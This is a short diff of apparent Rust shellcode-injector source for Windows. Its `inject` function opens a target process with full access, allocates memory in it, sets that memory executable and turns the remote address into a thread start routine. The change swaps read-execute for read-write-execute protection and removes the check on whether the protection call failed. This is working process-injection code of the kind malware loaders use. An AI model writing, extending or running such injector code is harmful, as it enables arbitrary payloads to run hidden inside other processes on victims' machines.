@@ -47,7 +47,7 @@ use windows_sys::Win32::System::Diagnostics::ToolHelp::{
 #[cfg(any(feature = "local", feature = "url"))]
 use windows_sys::Win32::System::Memory::{MEM_RELEASE, VirtualAlloc, VirtualFree};
 use windows_sys::Win32::System::Memory::{
-    MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE, VirtualAllocEx, VirtualProtectEx,
+    MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, PAGE_READWRITE, VirtualAllocEx, VirtualProtectEx,
 };
 use windows_sys::Win32::System::Threading::{ExitProcess, OpenProcess, PROCESS_ALL_ACCESS};
 
@@ -400,10 +400,7 @@ unsafe fn inject(pid: u32, sc: *const u8, len: usize) -> bool {
     }
 
     let mut old = 0u32;
-    if unsafe { VirtualProtectEx(hp, remote, len, PAGE_EXECUTE_READ, &mut old) } == 0 {
-        unsafe { CloseHandle(hp) };
-        return false;
-    }
+    unsafe { VirtualProtectEx(hp, remote, len, PAGE_EXECUTE_READWRITE, &mut old) };
 
     let start: Option<unsafe extern "system" fn(*mut core::ffi::c_void) -> u32> =
         Some(unsafe { core::mem::transmute(remote) });
